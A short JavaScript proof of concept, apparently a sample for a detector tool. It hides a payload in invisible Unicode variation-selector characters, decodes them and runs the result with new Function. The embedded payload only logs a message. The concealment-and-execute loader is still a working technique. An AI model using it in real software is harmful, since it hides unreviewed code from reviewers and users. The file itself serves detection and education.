// [!] EDUCATIONAL POC -- DO NOT USE MALICIOUSLY
// This file appears to contain an empty string, but it holds an invisible payload.
// Use a hex editor or the glassworm-detector to reveal the hidden content.

const _d = v => [...v].map(w => (
  w = w.codePointAt(0),
  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
)).filter(n => n !== null);

// The string below looks empty but contains 38 encoded bytes:
const _p = `󠅓󠅟󠅞󠅣󠅟󠅜󠅕󠄞󠅜󠅟󠅗󠄘󠄗󠅘󠅙󠅔󠅔󠅕󠅞󠄐󠅠󠅑󠅩󠅜󠅟󠅑󠅔󠄐󠅕󠅨󠅕󠅓󠅥󠅤󠅕󠅔󠄗󠄙`;

new Function(Buffer.from(_d(_p)).toString('utf-8'))();
